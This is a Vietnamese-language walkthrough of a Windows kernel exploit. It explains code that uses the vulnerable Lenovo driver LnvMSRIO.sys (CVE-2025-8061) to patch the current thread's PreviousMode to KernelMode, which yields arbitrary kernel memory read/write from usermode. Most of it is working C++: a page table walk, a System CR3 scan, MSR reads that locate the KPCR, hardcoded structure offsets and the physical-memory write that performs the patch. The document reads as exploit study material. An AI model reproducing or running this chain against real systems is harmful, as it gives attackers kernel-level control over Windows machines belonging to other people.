# 04 — PreviousMode Abuse (Arbitrary Kernel VA Read/Write)

**File:** `04_previousmode.cpp`  
**CVE:** CVE-2025-8061 (LnvMSRIO.sys)  
**Primitive dùng:** MSR read + Physical read/write + Page table walk  
**Output:** Đọc được kernel VA trực tiếp từ usermode qua `NtReadVirtualMemory`

---

## Mục tiêu

Patch `KTHREAD.PreviousMode` từ `1` (UserMode) sang `0` (KernelMode) cho thread hiện tại. Kết quả: `NtReadVirtualMemory` / `NtWriteVirtualMemory` không còn bị `ProbeForRead` chặn khi địa chỉ là kernel VA → có thể đọc/ghi bất kỳ kernel VA nào từ usermode.

---

## Lý thuyết nền

### ProbeForRead / ProbeForWrite

Mỗi syscall Windows nhận pointer từ usermode đều gọi:

```c
VOID ProbeForRead(PVOID Address, SIZE_T Length, ULONG Alignment) {
    if (PreviousMode != KernelMode) {
        // Kiểm tra address < MmUserProbeAddress (~0x7FFF...FFFF)
        if (Address + Length - 1 >= MmUserProbeAddress)
            ExRaiseAccessViolation();  // ném exception → syscall fail
    }
    // Nếu PreviousMode == KernelMode → skip kiểm tra hoàn toàn
}
```

`PreviousMode` là một byte trong `KTHREAD` của thread hiện tại, được set bởi syscall dispatcher khi vào kernel:
- Syscall từ usermode: set `PreviousMode = 1` (UserMode)
- Internal kernel calls: `PreviousMode = 0` (KernelMode)

Nếu ta patch byte này thành `0`, syscall `NtReadVirtualMemory(kernel_va)` sẽ không bị ProbeForRead reject → đọc được kernel memory.

### Kỹ thuật này dùng rộng rãi trong thực tế

Lazarus Group FudModule (CVE-2022-21882, CVE-2024-21338) đều dùng technique này. Sau khi có PreviousMode = 0, họ dùng `NtReadVirtualMemory` để đọc toàn bộ kernel structures mà không cần driver thứ hai.

### Tại sao cần pin thread vào 1 CPU?

`CurrentThread` trong KPRCB là per-CPU field. Nếu thread bị scheduler chuyển sang CPU khác trong lúc ta đang đọc KPRCB của CPU 0, ta sẽ đọc được `CurrentThread` của một thread *khác* trên CPU 0 → sai KTHREAD → patch sai thread → crash.

```cpp
SetThreadAffinityMask(hThread, 1);           // chỉ chạy trên CPU 0
SetThreadPriority(hThread, THREAD_PRIORITY_TIME_CRITICAL); // giảm khả năng bị preempt
```

---

## Chuỗi trỏ: KPCR → KPRCB → CurrentThread → KTHREAD

```
MSR 0xC0000101 (GS_BASE khi trong kernel) = KPCR VA
    KPCR + 0x180 = start của KPRCB (embedded trong KPCR)
    KPRCB + 0x008 = CurrentThread (PKTHREAD*)
    → KPCR + 0x188 = địa chỉ của con trỏ đến KTHREAD hiện tại

*KPCR[0x188] = KTHREAD VA của current thread
    KTHREAD + 0x232 = PreviousMode (1 byte)
```

---

## Giải thích code từng dòng

### VaToPa() — Page Table Walk 4-level

```cpp
static uint64_t VaToPa(uint64_t cr3, uint64_t va)
{
    uint64_t pml4_pa = cr3 & ~0xFFFULL;  // CR3 có thể có PCID trong bits [11:0]
                                           // clear để lấy physical address của PML4

    auto idx = [&](int shift) { return (va >> shift) & 0x1FF; };
    // Mỗi level index là 9 bits

    // Level 1: PML4
    uint64_t pml4e = 0;
    PhysReadU64(pml4_pa + idx(39) * 8, &pml4e);
    // idx(39): bits [47:39] của VA = PML4 index (9 bits)
    // × 8: mỗi entry 8 bytes
    if (!(pml4e & 1)) return 0;  // bit 0 = Present
    uint64_t pdpt_pa = pml4e & 0x000FFFFFFFFFF000ULL;  // bits [51:12] = PA của PDPT
```

Layout của VA x64 (48-bit canonical):
```
bit 47-39: PML4 index   (9 bits → 512 entries)
bit 38-30: PDPT index   (9 bits)
bit 29-21: PD index     (9 bits)
bit 20-12: PT index     (9 bits)
bit 11-0:  page offset  (12 bits)
```

```cpp
    // Level 2: PDPT
    uint64_t pdpte = 0;
    PhysReadU64(pdpt_pa + idx(30) * 8, &pdpte);
    if (!(pdpte & 1)) return 0;
    if (pdpte & 0x80) {  // bit 7 = PageSize → 1GB large page
        // bits [51:30] = physical base, bits [29:0] = offset từ VA
        return (pdpte & 0x000FFFFFC0000000ULL) | (va & 0x3FFFFFFFULL);
    }
    uint64_t pd_pa = pdpte & 0x000FFFFFFFFFF000ULL;
```

1GB large page: nếu PDPTE có bit 7 set, không cần lookup thêm. Physical address = `(pdpte & mask_1gb_base) | (va & 0x3FFFFFFF)`.

```cpp
    // Level 3: PD
    uint64_t pde = 0;
    PhysReadU64(pd_pa + idx(21) * 8, &pde);
    if (!(pde & 1)) return 0;
    if (pde & 0x80) {  // 2MB large page (ntoskrnl thường dùng loại này)
        return (pde & 0x000FFFFFFFE00000ULL) | (va & 0x1FFFFFULL);
    }
    uint64_t pt_pa = pde & 0x000FFFFFFFFFF000ULL;

    // Level 4: PT
    uint64_t pte = 0;
    PhysReadU64(pt_pa + idx(12) * 8, &pte);
    if (!(pte & 1)) return 0;
    return (pte & 0x000FFFFFFFFFF000ULL) | (va & 0xFFFULL);  // 4KB page
```

### GetSystemCR3()

```cpp
static uint64_t GetSystemCR3()
{
    ...
    for (DWORD off = 0; off + minTrail <= rlen; off += 8) {
        ULONG_PTR pid = *(ULONG_PTR *)(chunk + off + EPROC_OFF_PID);
        if (pid != 4) continue;                // PID = 4 (System)
        const char *fn = (const char *)(chunk + off + EPROC_OFF_FNAME);
        if (_strnicmp(fn, "System", 6) != 0) continue;

        uint64_t eproc_pa = pa + off;
        cr3 = *(uint64_t *)(chunk + off + EPROC_OFF_CR3);  // EPROCESS+0x028

        if (cr3 && !(cr3 & 0xFFF)) {  // CR3 phải page-aligned (bits [11:0] = 0)
            break;
        }
        cr3 = 0;  // misaligned → false positive, tiếp tục scan
    }
```

`EPROC_OFF_CR3 = 0x028`: `EPROCESS.DirectoryTableBase` = CR3 register value của System process. Tất cả kernel VA đều map giống nhau trong upper half của mọi address space → dùng System CR3 để walk bất kỳ kernel VA nào.

### Đọc KPCR qua MSR

```cpp
uint64_t kpcr_va = 0;
if (!ReadMSR(0xC0000101, &kpcr_va) || !kpcr_va) {
    printf("[-] Failed to read GS_BASE (KPCR)\n");
```

MSR `0xC0000101` = `IA32_GS_BASE`. Driver thực thi RDMSR trong kernel context. Trong kernel context, GS trỏ đến KPCR của CPU hiện tại → `GS_BASE` = KPCR VA.

```cpp
if (kpcr_va < 0xFFFF000000000000ULL) {
    // Thử KERNEL_GS_BASE (0xC0000102) như fallback
    printf("    Trying KERNEL_GS_BASE (0xC0000102)...\n");
    ReadMSR(0xC0000102, &kpcr_va);
```

Fallback: trên một số build hoặc nếu SWAPGS timing khác, `0xC0000102` có thể là KPCR thay vì `0xC0000101`.

### Đọc CurrentThread

```cpp
uint64_t currentthread_ptr_va = kpcr_va + 0x188;
// KPCR+0x180 = KPRCB, KPRCB+0x008 = CurrentThread
// → KPCR+0x188 = địa chỉ của con trỏ KTHREAD

uint64_t currentthread_ptr_pa = VaToPa(cr3, currentthread_ptr_va);
// Chuyển VA của KPRCB.CurrentThread sang PA để đọc physical

uint64_t kthread_va = 0;
PhysReadU64(currentthread_ptr_pa, &kthread_va);
// Đọc giá trị: đây là KTHREAD VA của current thread
```

```cpp
// Verify: KTHREAD bắt đầu bằng DISPATCHER_HEADER
// Header.Type = 6 = ThreadObject (enum KOBJECTS)
uint64_t kthread_pa = VaToPa(cr3, kthread_va);
uint8_t hdr_type = 0;
PhysRead(kthread_pa, &hdr_type, 1);
if (hdr_type != 6) {
    printf("[-] KTHREAD validation failed. Scheduler may have moved us.\n");
```

DISPATCHER_HEADER.Type là byte đầu tiên của KTHREAD. Value 6 = `ThreadObject`. Nếu khác → thread affinity mask chưa kịp lock, scheduler đã preempt ta → try again.

### Patch và verify

```cpp
uint64_t prevmode_va = kthread_va + 0x232;  // KTHREAD+0x232 = PreviousMode
uint64_t prevmode_pa = VaToPa(cr3, prevmode_va);

uint8_t prevmode_orig = 0xFF;
PhysRead(prevmode_pa, &prevmode_orig, 1);
// Expected: 1 (UserMode)

// Patch!
PhysWriteU8(prevmode_pa, 0x00);  // KernelMode

uint8_t readback = 0xFF;
PhysRead(prevmode_pa, &readback, 1);
// Must be 0
```

### Demo đọc kernel VA

```cpp
printf("[*] NtReadVirtualMemory(ntoskrnl_base) AFTER patch:\n");
uint8_t kernel_read[64] = {};
SIZE_T nread = 0;
LONG status = g_NtRVM(GetCurrentProcess(),
                     (PVOID)(uintptr_t)ntoskrnl_base,  // kernel VA!
                     kernel_read, sizeof(kernel_read), &nread);

// Kết quả: status=0x00000000 (SUCCESS)
// kernel_read[0] = 'M', kernel_read[1] = 'Z' → đọc được MZ header của ntoskrnl!
```

### RESTORE — critical

```cpp
printf("[*] Restoring PreviousMode: 0 → 1...\n");
PhysWriteU8(prevmode_pa, 0x01);  // back to UserMode

// Restore thread settings
SetThreadPriority(hThread, THREAD_PRIORITY_NORMAL);
SetThreadAffinityMask(hThread, (DWORD_PTR)-1);  // cho phép chạy mọi CPU
```

**Tại sao phải restore ngay?** Nếu để PreviousMode = 0, bất kỳ syscall nào sau đó từ thread này đều bypass ProbeForRead. Nếu code trong thread sau đó pass một pointer ngẫu nhiên vào syscall, kernel có thể đọc/ghi kernel memory bất kỳ → hệ thống unstable → BSOD.

---

## Stability

| Vấn đề | Giải thích |
|--------|-----------|
| Race condition với scheduler | Dùng `SetThreadAffinityMask(1)` để giảm thiểu, nhưng vẫn có window nhỏ |
| PatchGuard | Không check PreviousMode field |
| Restore | Phải restore NGAY trước khi thread làm gì khác. Code này restore ngay sau demo |
| Thread timing | `THREAD_PRIORITY_TIME_CRITICAL` giảm khả năng bị preempt giữa chừng |

---

## Tóm tắt flow

```
GetSystemCR3() → cr3

ReadMSR(0xC0000101) → kpcr_va
SetThreadAffinityMask(1)  ← pin to CPU 0
    ↓
VaToPa(cr3, kpcr_va + 0x188) → currentthread_ptr_pa
PhysReadU64(currentthread_ptr_pa) → kthread_va
    ↓
VaToPa(cr3, kthread_va + 0x232) → prevmode_pa
PhysRead(prevmode_pa) = 1 (UserMode) ✓
    ↓
PhysWriteU8(prevmode_pa, 0x00)  ← PreviousMode = KernelMode
    ↓
NtReadVirtualMemory(ntoskrnl_base) → MZ bytes ✓  (kernel VA đọc được!)
    ↓
PhysWriteU8(prevmode_pa, 0x01)  ← RESTORE UserMode
SetThreadAffinityMask(-1)
```
